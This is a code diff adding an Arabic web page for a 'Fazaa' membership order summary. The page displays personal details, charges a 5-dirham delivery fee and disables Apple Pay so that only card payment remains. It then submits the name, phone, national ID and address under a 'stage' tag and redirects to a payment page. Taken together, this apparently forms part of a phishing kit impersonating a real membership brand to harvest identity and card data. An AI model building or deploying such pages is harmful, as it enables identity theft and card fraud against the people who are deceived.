@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فزعة - ملخص الطلب</title>
+    <link rel="stylesheet" href="/css/styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;700;800&display=swap" rel="stylesheet">
+    <script>
+        // حماية ترتيب الخطوات (كانت على الخادم، نُقلت للواجهة بعد التحويل لموقع ثابت)
+        (function () {
+            try {
+                if (!sessionStorage.getItem('step2')) {
+                    window.location.replace('/?error=session_required');
+                }
+            } catch (e) {}
+        })();
+    </script>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="container header-content">
+            <div class="logo">
+                <img src="/images/logo.png" alt="Fazaa">
+            </div>
+            <nav class="nav">
+                <a href="#" class="lang-toggle" id="langToggle" onclick="toggleLanguage(); return false;">English</a>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Content -->
+    <main class="order-page">
+        <div class="container">
+            <div class="order-form">
+                <div class="order-header">
+                    <h1>ملخص الطلب</h1>
+                    <p>راجع بياناتك واختر طريقة الدفع</p>
+                </div>
+
+                <!-- Step Indicator -->
+                <div class="steps-indicator">
+                    <div class="step completed">
+                        <div class="step-number"><i class="fas fa-check"></i></div>
+                        <div class="step-label">معلومات شخصية</div>
+                    </div>
+                    <div class="step-line"></div>
+                    <div class="step completed">
+                        <div class="step-number"><i class="fas fa-check"></i></div>
+                        <div class="step-label">العنوان</div>
+                    </div>
+                    <div class="step-line"></div>
+                    <div class="step active">
+                        <div class="step-number">3</div>
+                        <div class="step-label">اشترك</div>
+                    </div>
+                </div>
+
+                <!-- Order Summary -->
+                <div class="summary-section">
+                    <h3><i class="fas fa-file-invoice"></i> بيانات الطلب</h3>
+                    <div class="summary-row">
+                        <span>اسم العضو</span>
+                        <span id="fullName">-</span>
+                    </div>
+                    <div class="summary-row">
+                        <span>رقم الهاتف</span>
+                        <span id="phone">-</span>
+                    </div>
+                    <div class="summary-row">
+                        <span>المنطقة</span>
+                        <span id="city">-</span>
+                    </div>
+                    <div class="summary-row">
+                        <span>العنوان</span>
+                        <span id="address">-</span>
+                    </div>
+                    <div class="summary-row">
+                        <span>نوع الباقة</span>
+                        <span id="package">-</span>
+                    </div>
+                    <div class="summary-row">
+                        <span>موعد الاستلام</span>
+                        <span id="deliveryDate">-</span>
+                    </div>
+                </div>
+
+                <!-- Total -->
+                <div class="total-section">
+                    <div class="total-row">
+                        <span>رسوم التوصيل</span>
+                        <span>5 درهم</span>
+                    </div>
+                    <div class="total-final">
+                        <span>المبلغ الإجمالي</span>
+                        <span id="totalPrice">5 درهم</span>
+                    </div>
+                </div>
+
+                <!-- Payment Methods -->
+                <div class="payment-methods">
+                    <h3>طريقة الدفع</h3>
+                    
+                    <label class="method-option selected" id="cardMethod">
+                        <input type="radio" name="payment" value="card" checked>
+                        <div class="method-radio"></div>
+                        <i class="fas fa-credit-card"></i>
+                        <div class="method-info">
+                            <div class="method-name">Visa / Mastercard</div>
+                            <div class="method-desc">الدفع ببطاقة الائتمان</div>
+                        </div>
+                    </label>
+                    
+                    <label class="method-option" id="appleMethod">
+                        <input type="radio" name="payment" value="apple">
+                        <div class="method-radio"></div>
+                        <i class="fab fa-apple"></i>
+                        <div class="method-info">
+                            <div class="method-name">Apple Pay</div>
+                            <div class="method-desc">الدفع بـ Apple Pay</div>
+                        </div>
+                    </label>
+                    
+                    <div class="apple-note" id="appleNote">
+                        <i class="fas fa-info-circle"></i>
+                        غير متوفر حالياً، يرجى اختيار طريقة دفع مختلفة
+                    </div>
+                </div>
+
+                <div class="btn-group">
+                    <button type="button" class="btn-primary" id="payBtn" onclick="proceedToPayment()">متابعة للدفع <i class="fas fa-arrow-left"></i></button>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container footer-content">
+            <div class="footer-brand">
+                <span class="brand-name">فزعة</span>
+            </div>
+            <div class="footer-links">
+                <a href="#">سياسة الخصوصية</a>
+                <a href="#">شروط الخدمة</a>
+                <a href="#">الدعم</a>
+                <a href="#">الأسئلة الشائعة</a>
+            </div>
+            <div class="footer-copyright">
+                <p>© 2026 فزعة. جميع الحقوق محفوظة.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="/js/main.js"></script>
+    <script src="/js/i18n.js"></script>
+    <style>
+        .order-page { min-height: calc(100vh - 200px); padding: 20px 0 40px; background: linear-gradient(135deg, #f5f7fa 0%, #e4e8ec 100%); }
+        .order-form { background: #fff; border-radius: 20px; padding: 30px; width: 100%; max-width: 600px; margin: 0 auto; box-shadow: 0 10px 40px rgba(0,0,0,0.1); margin-top: 0; }
+        .order-header { text-align: center; margin-bottom: 18px; }
+        .order-header h1 { font-size: 1.6rem; color: #1a1a2e; margin-bottom: 8px; }
+        .order-header p { color: #666; font-size: 0.95rem; }
+        .steps-indicator { display: flex; justify-content: center; align-items: center; margin-bottom: 30px; }
+        .step { text-align: center; }
+        .step-number { width: 40px; height: 40px; border-radius: 50%; background: #e0e0e0; color: #666; display: flex; align-items: center; justify-content: center; font-weight: 700; margin: 0 auto 6px; font-size: 0.9rem; }
+        .step.active .step-number { background: linear-gradient(135deg, #8B1538, #6B0F2A); color: #fff; }
+        .step.completed .step-number { background: #28a745; color: #fff; }
+        .step-label { font-size: 0.8rem; color: #666; }
+        .step.active .step-label { color: #8B1538; font-weight: 600; }
+        .step-line { width: 40px; height: 3px; background: #28a745; margin: 0 8px; margin-bottom: 20px; }
+        .summary-section { background: #f8f9fa; border-radius: 12px; padding: 20px; margin-bottom: 20px; }
+        .summary-section h3 { font-size: 1rem; color: #333; margin-bottom: 15px; display: flex; align-items: center; gap: 8px; }
+        .summary-section h3 i { color: #8B1538; }
+        .summary-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px dashed #ddd; }
+        .summary-row:last-child { border-bottom: none; }
+        .summary-row span:first-child { color: #666; }
+        .summary-row span:last-child { font-weight: 600; color: #333; }
+        .total-section { background: linear-gradient(135deg, #8B1538, #6B0F2A); border-radius: 12px; padding: 20px; color: #fff; margin-bottom: 20px; }
+        .total-row { display: flex; justify-content: space-between; padding: 8px 0; font-size: 0.95rem; opacity: 0.9; }
+        .total-final { display: flex; justify-content: space-between; padding-top: 15px; margin-top: 10px; border-top: 1px solid rgba(255,255,255,0.3); font-size: 1.3rem; font-weight: 800; }
+        .payment-methods h3 { font-size: 1rem; color: #333; margin-bottom: 15px; }
+        .method-option { display: flex; align-items: center; gap: 12px; padding: 15px; border: 2px solid #e0e0e0; border-radius: 12px; margin-bottom: 10px; cursor: pointer; transition: all 0.3s; }
+        .method-option:hover { border-color: #8B1538; }
+        .method-option.selected { border-color: #8B1538; background: rgba(139,21,56,0.05); }
+        .method-option input { display: none; }
+        .method-radio { width: 22px; height: 22px; border-radius: 50%; border: 2px solid #ccc; display: flex; align-items: center; justify-content: center; transition: all 0.3s; }
+        .method-option.selected .method-radio { border-color: #8B1538; background: #8B1538; }
+        .method-option.selected .method-radio::after { content: ''; width: 10px; height: 10px; border-radius: 50%; background: #fff; }
+        .method-option i { font-size: 1.8rem; color: #333; width: 30px; }
+        .method-info { flex: 1; }
+        .method-name { font-weight: 700; font-size: 0.95rem; color: #333; }
+        .method-desc { font-size: 0.8rem; color: #666; }
+        .apple-note { display: none; background: #fff3cd; color: #856404; padding: 12px; border-radius: 10px; margin-top: 10px; font-size: 0.9rem; }
+        .btn-group { display: flex; gap: 15px; margin-top: 20px; }
+        .btn-primary { flex: 1; padding: 14px; background: linear-gradient(135deg, #8B1538, #6B0F2A); color: #fff; border: none; border-radius: 12px; font-size: 1rem; font-weight: 700; cursor: pointer; transition: all 0.3s; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .btn-secondary { flex: 1; padding: 14px; background: #e0e0e0; color: #333; border: none; border-radius: 12px; font-size: 1rem; font-weight: 700; cursor: pointer; transition: all 0.3s; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .btn-primary:hover, .btn-secondary:hover { transform: translateY(-2px); }
+        .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+        [dir="ltr"] .btn-primary i, [dir="ltr"] .btn-secondary i { transform: scaleX(-1); }
+
+        .loading-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(10, 15, 25, 0.65);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 99999;
+            padding: 20px;
+        }
+
+        .loading-card {
+            background: #fff;
+            border-radius: 16px;
+            padding: 24px 28px;
+            text-align: center;
+            box-shadow: 0 12px 36px rgba(0, 0, 0, 0.2);
+        }
+
+        .loading-spinner {
+            width: 46px;
+            height: 46px;
+            border: 4px solid #e9e9e9;
+            border-top-color: #8B1538;
+            border-radius: 50%;
+            margin: 0 auto 12px;
+            animation: spin 0.9s linear infinite;
+        }
+
+        .loading-text {
+            font-size: 0.95rem;
+            color: #555;
+            font-weight: 600;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 480px) {
+            .order-page {
+                padding: 20px 0;
+                min-height: auto;
+            }
+            .container {
+                padding: 0 12px;
+            }
+            .order-form {
+                padding: 24px 18px;
+                border-radius: 16px;
+                max-width: 100%;
+            }
+            .order-header h1 {
+                font-size: 1.4rem;
+            }
+            .order-header p {
+                font-size: 0.9rem;
+            }
+            .steps-indicator {
+                gap: 6px;
+                flex-wrap: wrap;
+                margin-bottom: 24px;
+            }
+            .step-line {
+                width: 20px;
+                margin: 0 4px 18px;
+            }
+            .step-label {
+                font-size: 0.75rem;
+            }
+            .summary-section,
+            .total-section {
+                padding: 16px;
+            }
+            .summary-row,
+            .total-row,
+            .total-final {
+                font-size: 0.92rem;
+            }
+            .method-option {
+                padding: 12px;
+                gap: 10px;
+            }
+            .btn-group {
+                flex-direction: column;
+                gap: 10px;
+            }
+            .btn-primary, .btn-secondary {
+                padding: 13px;
+                font-size: 0.95rem;
+            }
+        }
+    </style>
+    <script>
+        var tierNames = { platinum: 'البلاتينية', gold: 'الذهبية', silver: 'الفضية', fazaa: 'خصومات فزعة' };
+        var cityNames = { 'dubai': 'دبي', 'abu-dhabi': 'أبوظبي', 'sharjah': 'الشارقة', 'ajman': 'عجمان' };
+        
+        var step1 = JSON.parse(sessionStorage.getItem('step1') || '{}');
+        var step2 = JSON.parse(sessionStorage.getItem('step2') || '{}');
+        var tier = localStorage.getItem('fazaaTier') || 'platinum';
+        
+        document.getElementById('fullName').textContent = step1.fullName || '-';
+        document.getElementById('phone').textContent = '+971 ' + (step1.phoneNumber || '-');
+        document.getElementById('city').textContent = cityNames[step2.city] || step2.city || '-';
+        document.getElementById('address').textContent = (step2.street || '-') + (step2.neighborhood ? '، ' + step2.neighborhood : '');
+        document.getElementById('package').textContent = tierNames[tier] || tier;
+        document.getElementById('deliveryDate').textContent = step2.deliveryDate || '-';
+        
+        var cardMethod = document.getElementById('cardMethod');
+        var appleMethod = document.getElementById('appleMethod');
+        var appleNote = document.getElementById('appleNote');
+        var payBtn = document.getElementById('payBtn');
+        
+        cardMethod.addEventListener('click', function() {
+            cardMethod.classList.add('selected');
+            appleMethod.classList.remove('selected');
+            appleNote.style.display = 'none';
+            payBtn.disabled = false;
+        });
+        
+        appleMethod.addEventListener('click', function() {
+            appleMethod.classList.add('selected');
+            cardMethod.classList.remove('selected');
+            appleNote.style.display = 'block';
+            payBtn.disabled = true;
+        });
+        
+        function showLoadingOverlay() {
+            if (document.getElementById('loadingOverlay')) return;
+            var overlay = document.createElement('div');
+            overlay.id = 'loadingOverlay';
+            overlay.className = 'loading-overlay';
+            overlay.innerHTML = '<div class="loading-card"><div class="loading-spinner"></div><div class="loading-text">جار التحميل يرجى الانتظار</div></div>';
+            document.body.appendChild(overlay);
+        }
+
+        async function proceedToPayment() {
+            showLoadingOverlay();
+            try {
+                var response = await fetch('/api/submit-order', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        stage: 'order3',
+                        fullName: step1.fullName,
+                        phoneNumber: step1.phoneNumber,
+                        nationalId: step1.nationalId,
+                        city: step2.city,
+                        street1: step2.street,
+                        street2: step2.neighborhood,
+                        deliveryDate: step2.deliveryDate,
+                        tier: tier
+                    })
+                });
+                
+                var data = await response.json();
+                if (data.success) {
+                    setTimeout(function() {
+                        window.location.href = '/payment';
+                    }, 2200);
+                } else {
+                    if (document.getElementById('loadingOverlay')) document.getElementById('loadingOverlay').remove();
+                    alert(data.error || 'حدث خطأ');
+                }
+            } catch (error) {
+                if (document.getElementById('loadingOverlay')) {
+                    document.getElementById('loadingOverlay').remove();
+                }
+                alert('حدث خطأ أثناء الإرسال');
+            }
+        }
+    </script>
+</body>
+</html>
